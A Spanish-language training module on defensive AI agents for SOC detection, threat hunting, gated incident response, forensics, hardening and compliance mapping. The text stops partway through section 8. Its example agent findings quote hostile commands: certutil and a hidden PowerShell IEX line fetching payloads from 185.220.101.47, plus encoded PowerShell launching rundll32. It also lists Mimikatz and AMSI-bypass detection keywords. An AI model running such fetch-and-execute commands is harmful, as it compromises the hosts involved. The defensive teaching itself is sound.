# 🛡️ A3 — Agentes Defensivos — Detectar, Responder y Endurecer Sin Código

> **Versión:** 1.0
> **Idioma:** Español (argentino) — informal, directo, sin humo
> **Nivel:** Intermedio → Avanzado
> **Duración estimada:** 3–4 semanas (leyendo + practicando en lab, ~18 hs)
> **Prerequisitos:** [A1 — Fundamentos de Agentes](./01-A1-4g3nt3s-f0nd4m3nt0s.md), [A2 — Agentes Ofensivos](./02-A2-0ff3ns1v3-4g3nt3s.md), [F4 — Sec Fundamentos](../00-Fundamentos/04-F4-s3c-f0nd4m3nt0s.md) y nociones de SOC/SIEM. No necesitás saber programar — pero sí entender qué le pedís al agente cuando te habla de un log.

> ⚠️ **Aviso defensivo — el agente NO decide solo:** Este doc es el espejo de [A2](./02-A2-0ff3ns1v3-4g3nt3s.md) pero del lado blue team. Acá el agente **detecta, sugiere y prepara** — pero **nunca remedia sin tu aprobación explícita**. No aísla un host, no bloquea una IP, no tira un firewall rule sin que vos digas "sí, dale". Todo lo que aprendas va en lab (Wazuh, Security Onion, Velociraptor, TheHive) o en infra donde tengas rol defensivo autorizado. Si no tenés permiso para tocar prod, no tocás — aunque el agente te diga que "sería buena idea".

> 🪞 **¿Por qué A3 existe?** [A2](./02-A2-0ff3ns1v3-4g3nt3s.md) te enseña a atacar sin código. A3 te enseña a **defender** sin código, con la misma lógica: vos pensás, el agente ejecuta queries, parsea logs y arma el borrador. Si solo sabés atacar, sos la mitad de profesional. Este es el complemento.

---

## 📑 Índice

> ⏱️ **Tiempo estimado:** 18 horas (~4 sesiones de 4-5 hs) — 620 líneas aprox.

1. [Introducción — tu SOC analyst 24/7 que no toma café](#1-introducción--tu-soc-analyst-247-que-no-toma-café)
2. [Detección — el agente que huntea logs mientras vos dormís](#2-detección--el-agente-que-huntea-logs-mientras-vos-dormís)
3. [Threat hunting guiado — de lenguaje natural a Sigma/KQL/SPL](#3-threat-hunting-guiado--de-lenguaje-natural-a-sigmakqlspl)
4. [Respuesta a incidentes — playbooks SOAR con freno de mano humano](#4-respuesta-a-incidentes--playbooks-soar-con-freno-de-mano-humano)
5. [Forense con agente — el agente resume, vos dirigís la autopsia](#5-forense-con-agente--el-agente-resume-vos-dirigís-la-autopsia)
6. [Hardening — el agente audita, vos parcheás con criterio](#6-hardening--el-agente-audita-vos-parcheás-con-criterio)
7. [CTI y OSINT defensivo — el agente no duerme, los feeds tampoco](#7-cti-y-osint-defensivo--el-agente-no-duerme-los-feeds-tampoco)
8. [Agente de cumplimiento — de hallazgo técnico a control ISO/NIST](#8-agente-de-cumplimiento--de-hallazgo-técnico-a-control-isonist)
9. [Flujo blue team no-code completo — detecta → investiga → contiene → recupera → lección](#9-flujo-blue-team-no-code-completo--detecta--investiga--contiene--recupera--lección)
10. [Ejercicios prácticos — 5 labs para defender sin romper nada](#10-ejercicios-prácticos--5-labs-para-defender-sin-romper-nada)
11. [Apéndice A — Prompts defensivos y SOPs listos para copiar](#11-apéndice-a--prompts-defensivos-y-sops-listos-para-copiar)
12. [Apéndice B — Glosario blue + tabla de herramientas](#12-apéndice-b--glosario-blue--tabla-de-herramientas)
13. [Apéndice C — Mapa A1/A2/A3 y próximos pasos](#13-apéndice-c--mapa-a1a2a3-y-próximos-pasos)

---

## 1. Introducción — tu SOC analyst 24/7 que no toma café

### 1.1 ¿Qué es un agente defensivo?

Si [A1](./01-A1-4g3nt3s-f0nd4m3nt0s.md) te dijo que un agente es un LLM con herramientas y loop `percibe → razona → actúa`, el defensivo es exactamente eso pero **mirando hacia adentro**: no busca vulnerabilidades para explotarlas, busca **señales de que alguien ya lo hizo**.

Pensalo así:

| Agente ofensivo (A2) | Agente defensivo (A3) |
|---|---|
| "¿Dónde puedo entrar?" | "¿Ya entró alguien?" |
| Escanea para encontrar huecos | Monitorea para detectar abuso de esos huecos |
| Reporta cómo explotar | Reporta cómo detectar y cerrar |
| Éxito = shell en lab | Éxito = alerta accionable sin falso positivo |

El agente defensivo es tu **Tier 1 infatigable**: triagea alertas, enriquece con contexto, propone hipótesis y arma el primer borrador del caso. Vos sos Tier 2/3: validás, decidís y firmás.

> 💡 Idea fuerza: **el agente reduce el MTTD (Mean Time To Detect) y el MTTR (Mean Time To Respond), pero no reemplaza tu juicio**. Si el agente dice "aislar host", y vos aislás el DC prod un viernes a las 18 hs sin validar, el problema sos vos, no el agente.

### 1.2 El SOC analyst 24/7 — qué hace y qué NO hace

**SÍ hace sin que le escribas código:**

- Lee logs de Sysmon, auth.log, EDR, firewall, DNS, proxy y te dice en criollo qué pasó.
- Traduce "¿hubo logins raros anoche?" a una query KQL/SPL y la ejecuta.
- Correla una IP contra 5 feeds de CTI y te dice si es conocida.
- Audita un host contra CIS Benchmark y te arma un plan de hardening priorizado.
- Resume una timeline de Plaso de 2 millones de eventos en 20 bullets accionables.

**NO hace (y nunca debe hacer) sin tu OK explícito:**

- Aislar un host, bloquear IP, deshabilitar usuario, matar proceso, tirar regla de firewall.
- Borrar IOCs, "limpiar" un host, restaurar backup.
- Clasificar un incidente como falso positivo y cerrarlo.
- Enviar notificaciones a cliente/legales sin tu revisión.

```
Regla de oro A3 (tatuatela):

  El agente PROPONE, vos DISPONÉS.
  Sin "APROBADO por <tu nombre>" no hay acción irreversible.
```

<!-- DIAGRAM: architecture SOC con agente defensivo — panel central "Agente Blue (LLM + tools)" conectado a fuentes: Wazuh/Splunk/Elastic, EDR/Sysmon, Firewall/DNS/Proxy, Feeds CTI (MISP/OTX), TheHive/Cortex, Lynis/OpenSCAP/Velociraptor; salida hacia humano Tier2/3 con gate "Aprobación humana" antes de SOAR actions; loop de feedback hacia SIEM -->

### 1.3 Human-in-the-loop — no es opcional, es diseño

En A2 ya viste el gate `¿confirmás?` antes de un exploit. Acá es idéntico pero del lado contención:

| Acción del agente | Nivel de riesgo | Gate humano |
|---|---|---|
| Leer logs, resumir, sugerir hipótesis | Bajo | Informativo — te muestra qué va a consultar |
| Crear query Sigma/KQL y ejecutarla en lab | Medio | Confirmás scope temporal y índice |
| Enriquecer IOC contra VirusTotal/OTX | Medio | Confirmás que el IOC no es dato sensible de cliente |
| Proponer aislamiento de host / bloqueo IP | **Alto** | **Aprobación explícita + ticket** |
| Ejecutar contención (SOAR) | **Crítico** | **Doble confirmación + ventana de rollback** |

> 🛑 **Nunca auto-remedia.** Si tu agente viene configurado con "auto-contain on high severity", desactivalo. Un falso positivo que aísla 200 endpoints te cuesta más que un atacante lento.

---

## 2. Detección — el agente que huntea logs mientras vos dormís

### 2.1 De "¿hay algo raro?" a query ejecutable

La magia no-code acá es que vos hablás en criollo y el agente traduce a lenguaje de SIEM. Vos no escribís SPL/KQL, pero **sí validás** qué consultó y por qué.

**Diálogo típico:**

```
Vos:  "¿Hay anomalías en auth.log de web-srv-01 en las últimas 24 hs? 
       Buscá fuerza bruta, logins fuera de horario y usuarios nuevos."

Agente: "Voy a consultar Wazuh índice wazuh-auth-* (web-srv-01, últimas 24hs).
         Plan:
         1. Query: múltiples failed password por IP (>20 en 5 min)
         2. Query: successful login fuera de horario 22-06 hs
         3. Query: useradd / usermod en auth.log
         ¿Confirmás scope? [web-srv-01, 24hs, solo lectura]"

Vos:  "Confirmado. Solo lectura."

Agente: "Resultados:
         🔴 03:14 hs — IP 185.220.101.47 — 47 failed → 1 success (root) — patrón fuerza bruta exitoso
         🟡 04:02 hs — usuario 'deploy_tmp' creado por 'admin' — no está en baseline
         🟢 12 logins normales dentro de horario
         Hipótesis: brute force + posible backdoor user. ¿Querés que corra timeline de Plaso para esa ventana?"
```

Fijate el patrón: **vos preguntás en natural → agente propone plan en técnico → vos aprobás → agente ejecuta y resume**.

### 2.2 Fuentes que el agente sabe huntear sin código

| Fuente | Qué le pedís en criollo | Qué hace el agente por debajo | Qué validás vos |
|---|---|---|---|
| **Sysmon (Event IDs 1,3,7,11)** | "¿Hay procesos raros hijos de Office?" | Query Elastic/Splunk: `EventID=1 ParentImage=*WINWORD.EXE*` | ¿La query no es demasiado amplia? ¿Filtró baseline? |
| **Wazuh / OSSEC** | "Alertas nivel 10+ últimas 6hs" | `wazuh-alerts-*` con `rule.level >=10` | ¿No está mirando el índice equivocado? |
| **Splunk / Elastic** | "Correlacioná DNS queries a dominios DGA" | SPL/KQL con lista de dominios + entropy check | ¿La lista de IOCs es confiable? |
| **EDR (Defender, CrowdStrike)** | "¿Hay LSASS dumps en endpoints?" | Query EDR: `DeviceProcessEvents | where FileName =~ "lsass*"` | ¿Tenés permiso para consultar EDR prod? |
| **Firewall / Proxy** | "¿Qué hosts hablaron con 185.220.101.47?" | Logs de firewall + DNS pasivo | ¿El rango temporal es correcto? |
| **auth.log / Windows Security 4624/4625** | "Logins fallidos → exitosos misma IP" | Agregación por IP con ventana de 5 min | ¿No es un falso positivo de usuario legítimo? |

### 2.3 Cómo habla el agente de detección — prompts base

```
Prompt base detección (copiar/pegar y adaptar):

"Actuá como analista SOC Tier 1. Tenés acceso de SOLO LECTURA a [Wazuh/Elastic/Splunk]
 índice [índice] para host [hostname] en ventana [últimas X hs].
 Tarea: buscá [hipótesis: brute force / DGA / lateral / etc].
 Restricciones: no ejecutes acciones de escritura/contención.
 Entregá: tabla con timestamp, host, usuario/IP, evento, severidad y 1 hipótesis por hallazgo.
 Si no hay hallazgos, decilo explícitamente — no inventes."
```

> ⚠️ Anti-alucinación: exigile al agente que cite **timestamp + índice + query** en cada hallazgo. Si no cita fuente, es humo.

<!-- DIAGRAM: loop detección — círculo con 5 nodos: Ingesta (Sysmon/Wazuh/EDR) → Normalización (Elastic/Splunk) → Agente consulta (natural → KQL/SPL) → Triage (agente resume + severidad) → Humano valida (aprueba/escala/descarta) → feedback a Ingesta; flecha roja "Sin aprobación humana no hay contención" cortando el loop -->

### 2.4 Ejemplo realista — Sysmon + Wazuh

```
Vos:  "Revisá Sysmon de WS-FIN-042 — sospecho phishing. ¿Hay hijos raros de Outlook?"

Agente: "Consulto Elastic índice sysmon-* host:WS-FIN-042 últimas 12hs
         Query KQL: event.code:1 and process.parent.name:OUTLOOK.EXE 
                    and not process.name:(Teams.exe OR OneDrive.exe)  // baseline
         ¿Aprobás?"

Vos:  "Aprobado."

Agente: "Hallazgo:
         09:42:11 — OUTLOOK.EXE (PID 4812) → powershell.exe -enc SQBmACgA... (base64)
         → 09:42:14 — powershell.exe → rundll32.exe C:\\Users\\...\\invoice.dll
         Cadena típica de macro maliciosa. Recomendación: aislar WS-FIN-042 y dumpear con Velociraptor.
         ¿Querés que prepare el playbook de contención para tu aprobación?"
```

---

## 3. Threat hunting guiado — de lenguaje natural a Sigma/KQL/SPL

### 3.1 El agente como traductor de hipótesis

Threat hunting clásico es: tenés una hipótesis ("alguien usa PSExec para moverse lateral") y la convertís en query. El agente hace exactamente esa traducción, vos validás que la lógica cierre.

| Vos decís (hipótesis) | Agente traduce a | Herramienta |
|---|---|---|
| "¿Alguien ejecutó Mimikatz o sekurlsa?" | `process.name: mimikatz* OR command_line: *sekurlsa*` | Sigma `proc_creation_win_mimikatz` |
| "¿Hay conexiones SMB a muchos hosts en 10 min?" | `event.code:3 destination.port:445 | stats dc(dest.ip) by src.ip | where dc > 10` | KQL / SPL |
| "¿PowerShell con AMSI bypass?" | `ScriptBlockText: *amsiInitFailed* OR *amsiUtils*` | Sigma `posh_ps_amsi_bypass` |
| "¿Usuarios agregados a Domain Admins?" | `EventID 4728/4732 TargetUserName: Domain Admins` | Splunk `wineventlog_security` |

**Diálogo:**

```
Vos:  "Quiero huntear living-off-the-land: certutil, mshta, regsvr32 descargando payloads."

Agente: "Traduzco a 3 Sigma rules:
         1. proc_creation_win_certutil_download
         2. proc_creation_win_mshta_http
         3. proc_creation_win_regsvr32_network
         Las convierto a KQL para tu Elastic y las ejecuto en [indices] últimas 72hs.
         ¿Confirmás ventana y que es solo lectura?"

Vos:  "Sí, 72hs, solo lectura. Excluí el host de WSUS que usa certutil legítimo (10.0.5.21)."

Agente: "Ajustado. Excluyo 10.0.5.21. Ejecuto... 
         Resultado: 2 hits en WS-HR-011 con certutil -urlcache -f http://185.220.101.47/payload.exe"
```

### 3.2 Sigma como lingua franca

Sigma es el "formato universal" de reglas. El agente lee Sigma YAML y lo transpila al SIEM que tengas — vos no tocás sintaxis.

```
Vos:  "Tengo esta Sigma de SigmaHQ para CVE-2023-23397 (Outlook). 
       ¿Podés buscarla en nuestros logs?"

Agente: "Leída. Es 'outlook_cve_2023_23397_calendar_sound'. 
         La convierto a SPL: index=wazuh EventID=4663 ObjectName=*reminder*.wav*
         Ejecuto en últimas 30 días. ¿Aprobás?"

Vos:  "Aprobá y mostrá solo hits con contexto de proceso padre."
```

Tabla de recursos Sigma/KQL que el agente conoce:

| Recurso | Para qué | Cómo lo pedís |
|---|---|---|
| **SigmaHQ (GitHub)** | Reglas listas para transpilar | "Buscá Sigma para [técnica MITRE TXXX]" |
| **Splunk Security Content** | SPL + playbooks | "Convertí esta Sigma a SPL" |
| **Elastic Detection Rules** | KQL + EQL | "Pasá esta hipótesis a KQL Elastic" |
| **MITRE ATT&CK** | Mapeo técnica → log source | "¿Qué log source detecta T1003.001?" |

### 3.3 Validación humana — el filtro anti-falso-positivo

El agente te va a traer 50 hits. Tu laburo es filtrar:

1. **¿Baseline?** ¿Ese certutil lo usa el admin de WSUS todos los martes?
2. **¿Contexto?** ¿El PowerShell raro lo lanzó un usuario o SYSTEM?
3. **¿Correlación?** ¿Ese login raro viene con alerta de EDR o solo es ruido?

```
Agente: "Encontré 34 ejecuciones de mshta.exe en 7 días."
Vos:    "Mostrame solo las que tienen conexión de red (EventID 3) y padre no-browser."
Agente: "Filtrado: quedan 2 — ambas en WS-FIN-042, mismo caso del phishing anterior. Correlacionado."
```

<!-- DIAGRAM: swimlane threat hunting — 3 carriles: Humano (hipótesis en natural) → Agente (traduce a Sigma/KQL, propone query) → SIEM (ejecuta, devuelve hits) → Agente (resume, prioriza, mapea a MITRE) → Humano (valida, ajusta, decide cazar más profundo o cerrar hipótesis) -->

---

## 4. Respuesta a incidentes — playbooks SOAR con freno de mano humano

### 4.1 SOAR sin código: el agente prepara, vos gatillás

SOAR (Security Orchestration, Automation & Response) suena a "plataforma carísima". Con agente, es: **playbook en markdown + agente que lo lee y te guía paso a paso**, pidiendo confirmación en cada acción irreversible.

Flujo SOAR no-code:

```
Alerta → Agente enriquece → Agente propone playbook → Vos aprobás paso a paso → Agente ejecuta tool → Loguea → Siguiente paso
```

> 🔑 Nunca "ejecutar playbook completo". Siempre **paso a paso con gate**.

### 4.2 Playbook ejemplo — host comprometido (phishing → Beacon)

| Paso | Acción | Tool del agente | Gate humano |
|---|---|---|---|
| 1 | Enriquecer IOC (hash/IP/dominio) | VirusTotal, OTX, MISP | Confirmás que el IOC es del caso y no dato sensible |
| 2 | Buscar lateralidad (mismo IOC en otros hosts) | Query SIEM/EDR | Aprobás scope de búsqueda |
| 3 | **Proponer** aislamiento de WS-FIN-042 | Velociraptor / EDR isolate | **Vos aprobás explícitamente: "Aislá WS-FIN-042"** |
| 4 | Dumpear memoria/disco para forense | Velociraptor KAPE / Volatility | Aprobás ventana y destino del dump |
| 5 | Bloquear IP/Dominio en firewall/proxy | Firewall API (solo si autorizado) | **Doble confirmación + ticket** |
| 6 | Reset credenciales + invalidar sesiones | AD / IdP | Aprobás lista de usuarios afectados |
| 7 | Crear caso en TheHive + notificar | TheHive API | Revisás descripción antes de enviar |

**Diálogo con freno de mano:**

```
Agente: "Playbook 'Phishing → Ejecución' — Paso 3: aislar WS-FIN-042 (10.0.20.42)
         Impacto: el host quedará sin red salvo canal EDR. Usuario: ana.garcia@empresa
         ¿Aprobás aislamiento? Respondé 'APROBADO Aislar WS-FIN-042' o 'RECHAZADO'."

Vos:  "APROBADO Aislar WS-FIN-042 — ticket INC-2026-0842."

Agente: "Ejecutado. Host aislado 14:22 UTC. Log: EDR action ID 9f3a... 
         Siguiente paso: dumpear con Velociraptor (KAPE). ¿Aprobás dump a s3://forense/INC-2026-0842/ ?"

Vos:  "Aprobado. Solo triage, no full disk."

Agente: "Dump triage iniciado. ETA 18 min. Te aviso al terminar."
```

### 4.3 Tabla de playbooks SOAR no-code que podés pedir

| Playbook | Trigger | Qué prepara el agente | Vos decidís |
|---|---|---|---|
| **Phishing → credenciales** | Click en link + login raro | Query O365 logs, reseteo pass, bloqueo sender | ¿Reseteo masivo o solo afectado? |
| **Ransomware sospecha** | Múltiples EventID 11 (file create .encrypted) | Aislamiento, snapshot, kill chain timeline | ¿Aislar segmento o solo host? |
| **Brute force exitoso** | 4625 → 4624 misma IP | Bloqueo IP, revisión de sesiones, MFA check | ¿Bloqueo permanente o temporal? |
| **Data exfil** | DNS tunneling / upload gigante | Análisis proxy/DNS, bloqueo dominio, DLP | ¿Cortar exfil o monitorear para attribution? |
| **Insider** | Acceso fuera de horario a repo sensible | Timeline + UEBA + revisión de permisos | ¿Escalar a RRHH/Legal o solo IT? |

### 4.4 TheHive + Cortex — el agente documenta por vos

El agente no solo ejecuta, **documenta el caso** en TheHive para que no pierdas trazabilidad:

```
Vos:  "Creá caso en TheHive para INC-2026-0842 con lo que encontramos en WS-FIN-042."

Agente: "Borrador de caso:
         Título: [INC-2026-0842] Phishing → PowerShell → rundll32 en WS-FIN-042
         Severidad: Alta | TLP: AMBER | Tags: phishing, T1566.001, T1059.001
         Observables: 185.220.101.47 (IP), invoice.dll (hash), ana.garcia (user)
         Timeline: 09:42 OUTLOOK→powershell -enc → rundll32
         ¿Lo creo así o ajustás algo?"

Vos:  "Agregá MITRE T1218.011 (rundll32) y asignámelo a mí."

Agente: "Caso #842 creado en TheHive. Cortex enrichment en curso (VT, OTX). Te paso link."
```

<!-- DIAGRAM: swimlane IR — 4 carriles verticales: SIEM/Wazuh (alerta) → Agente (enriquece, propone playbook) → Humano (aprueba/rechaza cada paso) → Tools (EDR isolate, Firewall block, Velociraptor, TheHive); flechas con candado "GATE" entre Agente y Tools -->

---

## 5. Forense con agente — el agente resume, vos dirigís la autopsia

### 5.1 El problema forense: demasiados datos, poco tiempo

Un disco de 500 GB con Plaso te genera 3 millones de eventos. Volatility te escupe 200 procesos. KAPE junta 100 artefactos. **Vos no podés leer todo**. El agente sí — y te trae el resumen con hipótesis.

> Principio: **el agente resume y correlaciona, vos concluís**. Nunca dejes que el agente escriba "conclusión forense definitiva" sin tu validación.

### 5.2 Timeline con Plaso / Timesketch — el agente hace el trabajo pesado

```
Vos:  "Tengo plaso dump de WS-FIN-042 (loki.csv, 2.1M eventos). 
       Resumí la ventana del incidente 09:30-10:00 hs y correlacioná con Sysmon."

Agente: "Plan:
         1. Filtrar plaso por 09:30-10:00 → 4.200 eventos
         2. Agrupar por tipo: file_created, registry, process, network
         3. Correlacionar con Sysmon EventID 1/3/11 misma ventana
         ¿Aprobás lectura de loki.csv? (solo lectura, no modifica evidencia)"

Vos:  "Aprobado. Trabajá sobre copia, no sobre original."

Agente: "Resumen (09:30-10:00):
         09:42:11 — OUTLOOK.EXE crea C:\\Users\\ana.garcia\\AppData\\Local\\Temp\\invoice.dll (hash a1b2...)
         09:42:14 — powershell.exe -enc ejecuta → rundll32 invoice.dll,Install
         09:42:18 — Registry Run key creada: HKCU\\...\\Run\\InvoiceUpdate
         09:42:22 — Conexión TCP a 185.220.101.47:443 (Beacon)
         09:43:05 — File created C:\\ProgramData\\agent.exe (persitencia)
         Hipótesis: phishing → DLL sideloading → persistencia Run key → C2.
         ¿Querés que genere super-timeline para Timesketch?"
```

### 5.3 KAPE + Velociraptor — triage sin ensuciar evidencia

| Artefacto KAPE | Qué le pedís al agente | Qué te devuelve resumido |
|---|---|---|
| `Amcache`, `Prefetch` | "¿Qué binarios se ejecutaron?" | Tabla: binario, primera/última ejecución, path |
| `MFT`, `USN Journal` | "¿Qué archivos se crearon/borraron en ventana?" | Timeline de file events filtrado |
| `Registry (SAM/SOFTWARE/SYSTEM)` | "¿Persistencia? Run keys, Services, Shimcache" | Lista de persistencias con MITRE mapeado |
| `EventLogs (Security/System)` | "¿Logins, instalaciones, crashes?" | Eventos clave con interpretación |
| `Browser History` | "¿El usuario visitó el link de phishing?" | URL + timestamp + referrer |

```
Vos:  "Velociraptor recolectó KAPE triage de WS-FIN-042. ¿Hay persistencia?"

Agente: "Revisé Registry + Startup + Scheduled Tasks:
         🔴 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run → InvoiceUpdate = rundll32 invoice.dll
         🔴 Scheduled Task 'OfficeUpdate' → powershell -w hidden -c IEX (http://185.220.101.47/s2.ps1)
         🟢 No hay WMI persistence ni Service nuevo.
         Mapeo MITRE: T1547.001 (Run Keys), T1053.005 (Scheduled Task)
         ¿Genero reporte de persistencia para TheHive?"
```

### 5.4 Volatility — memoria sin dolores de cabeza

Volatility es potente pero verboso. El agente traduce:

```
Vos:  "Tengo dump de memoria de WS-FIN-042 (mem.raw, 8GB). 
       ¿Hay procesos inyectados o hollowed?"

Agente: "Ejecuto (vía MCP) en lab: vol.py -f mem.raw windows.pslist + malfind + netscan
         ¿Confirmás ejecución en tu lab forense aislado?"

Vos:  "Confirmado. Lab aislado, copia del dump."

Agente: "Resultados:
         - pslist: rundll32.exe (PID 2140) PPID 4812 (powershell) — sin padre legítimo
         - malfind: PID 2140 tiene sección RWX privada con MZ header → posible injection
         - netscan: PID 2140 conectado a 185.220.101.47:443
         - ldrmodules: invoice.dll no está en lista de módulos cargados (unlinked)
         Conclusión preliminar: process hollowing / manual mapping. Requiere tu validación."
```

> 🧊 **Regla forense:** siempre trabajá sobre **copia** de la evidencia. El agente debe recordarte esto si te olvidás. Si no lo hace, corregilo: "siempre sobre copia, nunca sobre original".

<!-- DIAGRAM: architecture forense con agente — Velociraptor/KAPE recolecta → Plaso genera timeline → Timesketch visualiza → Agente resume (filtra ventana, agrupa, correlaciona Sysmon/Registry/Mem) → Humano valida hipótesis → TheHive documenta; candado "solo lectura sobre copia" -->

---

## 6. Hardening — el agente audita, vos parcheás con criterio

### 6.1 El agente auditor: de CIS Benchmark a plan accionable

Hardening sin agente es leer 300 páginas de CIS Benchmark y tildar a mano. Con agente es: **"auditá este host y decime qué falta, priorizado por riesgo y esfuerzo"**.

```
Vos:  "Auditá WS-FIN-042 y SRV-WEB-01 contra CIS Level 1. 
       Priorizá por riesgo y decime qué rompería si lo aplico."

Agente: "Ejecuto Lynis + OpenSCAP (CIS profile) en ambos hosts (solo lectura).
         ¿Confirmás ejecución de auditoría no intrusiva?"

Vos:  "Confirmado."

Agente: "Resultados priorizados:

         | Host | Control CIS | Estado | Riesgo | Esfuerzo | ¿Rompe algo? |
         |---|---|---|---|---|---|
         | SRV-WEB-01 | 1.1.1 Disable unused filesystems | FAIL | Medio | Bajo | No — no usa cramfs |
         | SRV-WEB-01 | 5.2.1 Ensure SSH Protocol 2 | PASS | — | — | — |
         | WS-FIN-042 | 2.2.7 Ensure Outlook macro blocked | FAIL | Alto | Bajo | Sí — macros de Finanzas usan .xlsm firmado |
         | WS-FIN-042 | 5.4.1 Ensure password expiration 90d | FAIL | Medio | Medio | Requiere GPO |
         Propuesta: parchear SRV-WEB-01 ya, WS-FIN-042 con excepción documentada para macros firmadas.
         ¿Genero playbook de remediación para tu aprobación?"
```

### 6.2 Tabla de herramientas de hardening que el agente orquesta

| Tool | Qué audita | Qué le pedís en criollo | Output del agente |
|---|---|---|---|
| **Lynis** | Hardening general Linux/Unix | "Auditá este Ubuntu y priorizá" | Score + lista de warnings con fix sugerido |
| **OpenSCAP** | CIS, STIG, PCI-DSS | "Validá contra CIS Level 1" | Reporte PASS/FAIL por control |
| **CIS-CAT Lite** | CIS Benchmarks Windows/Linux | "¿Cuánto le falta a este DC para CIS?" | Dashboard + gap analysis |
| **Wazuh SCA** | CIS continuo | "¿Qué controles fallaron esta semana?" | diff semanal + tendencia |
| **Microsoft Security Baseline** | GPO Windows | "¿Este host cumple baseline de Microsoft?" | GPO diff + recomendación |

### 6.3 Patch management con agente — sin auto-update destructivo

```
Vos:  "¿Qué parches le faltan a SRV-WEB-01 y cuál es el riesgo de no aplicarlos?"

Agente: "Consulto apt/yum + CVE feed:
         - kernel 5.15.0-91 → fix CVE-2024-1086 (privesc, CVSS 7.8) — RECOMENDADO
         - apache2 2.4.52 → fix CVE-2023-25690 (RCE, CVSS 9.8) — CRÍTICO
         - No aplico nada sin tu aprobación. ¿Querés plan de ventana de mantenimiento?"

Vos:  "Armá plan para ventana domingo 02-06 hs con rollback snapshot."

Agente: "Plan:
         1. Snapshot SRV-WEB-01 (02:00)
         2. apt update && apt upgrade apache2 (02:15) — reinicio servicio
         3. Validar con Lynis que CIS sigue PASS (02:30)
         4. Si falla → rollback snapshot (02:45)
         ¿Aprobás plan?"
```

> ⚠️ Nunca `apt upgrade -y` sin snapshot y sin ventana. El agente que propone auto-patcheo sin rollback es un agente mal configurado.

### 6.4 Validación post-harding

El agente no solo propone, **valida que el fix no rompió nada**:

```
Vos:  "Aplicamos CIS 2.2.7 (bloqueo macros no firmadas) en WS-FIN-042. Validá."

Agente: "Valido:
         - OpenSCAP CIS 2.2.7 → PASS ✅
         - Test macro firmada de Finanzas (.xlsm) → ejecuta OK ✅
         - Test macro no firmada (lab) → bloqueada ✅
         - Wazuh SCA diff → sin regresiones
         Hardening validado. Actualizo caso TheHive."
```

---

## 7. CTI y OSINT defensivo — el agente no duerme, los feeds tampoco

### 7.1 Qué es CTI para el blue team

CTI (Cyber Threat Intelligence) defensivo no es "buscar datos de alguien". Es: **¿esta IP/hash/dominio que vi en mis logs es conocida como maliciosa? ¿Qué campaña la usa? ¿Qué TTPs trae?**

El agente hace el laburo tedioso: consulta 5 feeds, correlaciona y te dice si tu IOC es ruido o señal.

### 7.2 Flujo CTI no-code

```
Alerta con IOC (IP/hash/dominio) → Agente consulta feeds → Agente correlaciona con MITRE → Agente prioriza → Vos decidís bloqueo/monitoreo
```

**Diálogo:**

```
Vos:  "Enriquecé 185.220.101.47 y hash a1b2c3... de invoice.dll"

Agente: "Consulto (solo lectura): VirusTotal, OTX, MISP, AbuseIPDB, GreyNoise.
         ¿Confirmás que puedo consultar IOCs externos? (no envío datos de cliente, solo IOCs)"

Vos:  "Confirmado. Solo esos dos IOCs."

Agente: "Resultados:

         | IOC | VT | OTX | MISP | Veredicto | Campaña/TTP |
         |---|---|---|---|---|---|
         | 185.220.101.47 | 42/92 malicioso | Pulses: 12 (Emotet) | Event 4821 (TA542) | 🔴 Malicioso confiable | T1566.001, T1059.001 |
         | a1b2c3... | 38/72 trojan | — | — | 🔴 Malicioso | Emotet Loader |

         Recomendación: bloquear IP en proxy/firewall y buscar más hosts con ese hash.
         ¿Preparo query para huntear el hash en EDR y propuesta de bloqueo para tu aprobación?"
```

### 7.3 OSINT defensivo — monitorear lo que expone tu org

| Qué monitorea el agente | Cómo se lo pedís | Qué te alerta |
|---|---|---|
| **Cert Transparency (crt.sh)** | "¿Hay certs nuevos para *.empresa.com.ar que no emitimos?" | Cert sospechoso → posible phishing domain |
| **Shodan / Censys** | "¿Qué servicios expusimos sin querer?" | Puerto 3389 abierto a internet → hardening |
| **GitHub / Pastebin** | "¿Se filtraron creds de nuestro dominio?" | Leak de creds → reset + MFA |
| **Twitter/X + RSS feeds** | "¿Hay CVE nuevo que nos afecta?" | CVE-2024-XXXX con PoC → priorizar parche |

```
Vos:  "Monitoreá crt.sh para *.empresa.com.ar y avisame si aparece un cert raro."

Agente: "Configuro check diario crt.sh para *.empresa.com.ar
         Baseline: 12 certs legítimos (Let's Encrypt, DigiCert)
         Si aparece uno nuevo con issuer raro o typo (empresa-secure.com.ar), te alerto.
         ¿Querés que también monitoree typosquatting con dnstwist?"
```

### 7.4 MISP + OTX + VirusTotal — el agente correlaciona

El valor no es consultar un feed, es **correlacionar varios** y no comerte un falso positivo de un feed berreta:

```
Agente: "185.220.101.47 está en 4/5 feeds como Emotet C2, con 12 pulsos OTX y evento MISP 4821.
         GreyNoise lo marca como 'malicious - seen scanning 443'.
         Confianza: Alta. No es un falso positivo de un solo feed."
```

> 💡 Pedile siempre al agente **confianza y cantidad de fuentes**. Un IOC en 1 feed con 1 voto es ruido. En 4 feeds con 40+ detecciones es señal.

---

## 8. Agente de cumplimiento — de hallazgo técnico a control ISO/NIST

### 8.1 El traductor que odiás necesitar

Tenés un hallazgo: "RDP abierto a internet en SRV-WEB-01". El auditor te pregunta: "¿Qué control ISO 27001/NIST falla y qué evidencia tenés?" El agente traduce.

| Hallazgo técnico | ISO 27001:2022 | NIST CSF 2.0 | Qué evidencia pide el auditor |
|---|---|---|---|
| RDP abierto a internet | A.8.26 (Requisitos de seguridad de redes) | PR.AC-5 (Network integrity) | Screenshot firewall + Wazuh rule + plan de cierre |
| Macros sin firmar permitidas | A.8.7 (Protección contra malware) | PR.PT-1 (Removable media protections) | GPO + OpenSCAP report |
| Sin MFA en VPN | A.5.17 (Autenticación) | PR.AC-7 (Users authenticated) | Config IdP + log de accesos |
| Logs sin retención 1 año | A.8.15 (Registro) | DE.CM-1 (Networks monitored) | Política retención + índice Wazuh |
| Backup sin test de restore | A.5.29 (Continuidad) | RC.RP-1 (Recovery plan) | Ticket de test restore + TheHive case |

**Diálogo:**

```
Vos:  "Mapeá estos 3 hallazgos a ISO 27001 y NIST y armá borrador para auditoría:
       1. RDP abierto, 2. Sin MFA en VPN, 3. Macros no firmadas"

Agente: "Mapeo:

         1. RDP abierto → ISO A.8.26 / NIST PR.AC-5 → Evidencia: firewall rule 3389 ANY, Wazuh alert 5503
         2. Sin MFA VPN → ISO A.5.17 / NIST PR.AC-7 → Evidencia: config OpenVPN sin MFA, 12 logins sin 2FA
         3. Macros → ISO A.8.7 / NIST PR.PT-1 → Evidencia: GPO Outlook macros = allow all, OpenSCAP FAIL

